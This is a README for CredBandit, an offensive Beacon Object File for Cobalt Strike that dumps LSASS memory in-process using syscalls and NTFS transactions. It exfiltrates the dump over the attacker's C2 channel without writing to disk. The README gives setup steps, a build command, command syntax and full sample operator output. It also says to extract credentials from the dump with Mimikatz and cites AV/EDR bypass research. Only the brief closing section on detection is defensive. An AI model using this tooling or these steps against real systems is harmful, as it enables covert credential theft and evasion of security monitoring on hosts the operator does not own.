# CredBandit

CredBandit is a proof of concept Beacon Object File (BOF) that uses static x64 syscalls to perform a complete in memory dump of a process and send that back through your already existing Beacon communication channel.  The memory dump is done by using NTFS transactions which allows us to write the dump to memory and the MiniDumpWriteDump API has been replaced with an adaptation of ReactOS's implementation of MiniDumpWriteDump. 

The memory dump is then downloaded over the beacon with Beacon's native download functionality. The advantage of doing it this way is that the dump is never written to disk and is sent via your already established C2 channel. 

# Subject References
This tool wouldn't exist without being able to piggyback off some really great research, tools, and code already published by members of the security community. So thank you. Lastly, if you feel anyone has been left out below, please let me know and I will be sure to get them added.
- Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR (by [@Cneelis](https://twitter.com/Cneelis)) - [here](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
- Direct Syscalls in Beacon Object Files (by [@Cneelis](https://twitter.com/Cneelis)) - [here](https://outflank.nl/blog/2020/12/26/direct-syscalls-in-beacon-object-files/)
- TransactedSharpMiniDump - [here](https://github.com/PorLaCola25/TransactedSharpMiniDump)
- rookuu/BOFS/MiniDumpWriteDump (by [@rookuu_](https://twitter.com/rookuu_))- [here](https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump) - Did all the heavy lifting for converting the ReactOS minidump.c to BOF compatible code
- SysWhispers (by [@Jackson_T](https://twitter.com/Jackson_T))- [here](https://github.com/jthuraisamy/SysWhispers)
- InlineWhsipers - [here](https://github.com/outflanknl/InlineWhispers)
- ([@ilove2pwn_](https://twitter.com/ilove2pwn_)) - Confirmed my original idea of the possibility of being able to use BeaconPrintf() function to send data back through CS, helped me get started with writing/understanding the amazing (insert == sarcasm) sleep language.  I also borrowed and modified little bit of logic for chunking data in C [here](https://gist.github.com/SecIdiot/82e4162e495602f064aba5b42575da5e)
- ([@BinaryFaultline](https://twitter.com/BinaryFaultline)) - Added the ability to use beacon's native download functionality
- ([@Cr0Eax](https://twitter.com/Cr0Eax]) and [@_EthicalChaos_](https://twitter.com/_EthicalChaos_)) - Initial discovery and usage of Beacon's native download functionality. See their tweets about it: https://twitter.com/_EthicalChaos_/status/1413229432219779074?s=20 and https://twitter.com/Cr0Eax/status/1412761297951739907?s=20

## Getting Started

1. Copy the credBandit folder with all of its contents and place it a directory just above your cobaltstrike folder on whatever system you plan to connect with via the GUI application.
2. Load in the MiniDumpWriteDump.cna Aggressor script
3. Run credBandit against target LSASS process (or other process)
4. Download the dump file from the Aggressor Downloads console
6. Use Mimikatz to extract the dump file

### Build Your Own

Run the below command inside the src directory
```
x86_64-w64-mingw32-gcc -o credBanditx64.o -c credBandit.c  -masm=intel
```

### Use Case

> *With High or SYSTEM integrity, the operator can perform a memory dump of LSASS without ever touching disk*

### Syntax

Perform memory dump and send back through CS using BeaconPrintf function. The second parameter of output name is optional and will show up in the Aggressor Downloads console as mem:\\[output].dmp

```
beacon> credBandit 708 output
[*] Running credBandit by (@anthemtotheego)
[+] host called home, sent: 18696 bytes
[+] received output:
[+] Attempting To Enable Debug Privs

[+] received output:
[+] Attempting To Dump Proccess 708

[+] received output:
[+] NtOpenProcess returned HANDLE 0x00000000000006CC

[+] received output:
[+] NtCreateTransaction returned HANDLE 0x00000000000006D4

[+] received output:
[+] RtlSetCurrentTransaction successfully set

[+] received output:
[+] NtCreateFile returned HANDLE 0x00000000000006D8

[+] received output:
[+] RtlSetCurrentTransaction successfully set

[+] received output:
[+] OS Version: 10.0.19042

[+] received output:
[+] MiniDump written to memory

[+] received output:
[+] MiniDump Size In Bytes = 109868198

[+] received output:
[+] NtCreateSection created

[+] received output:
[+] NtMapViewOfSection successful

[*] started download of mem:\output.dmp (109868198 bytes)
[*] download of output.dmp is complete
```

## Caveats

1. While I have tried to make this pretty stable, Although this method has become more stable with the download method, BOFs still carry the risk of causing a beacon to crash. Use at your own risk.
2. Since the BOF is executed in process and takes over the beacon while running, sleep time is not relevant.  Data will be continously sent while dump is exfiltrated.
3. Lastly, I commented in the code places where you could make modifications if you wanted to do other stuff, for example, write to disk instead, add in different encoding/encryption, Comms, etc.
 
## Detection

Some detection and mitigation strategies that could be used:

1. Credential Guard [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)
2. Event Tracing [here](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing)
3. Looking for suspicious processes touching LSASS
4. Looking for other known Cobalt Strike Beacon IOC's or C2 egress/communication IOC's. 
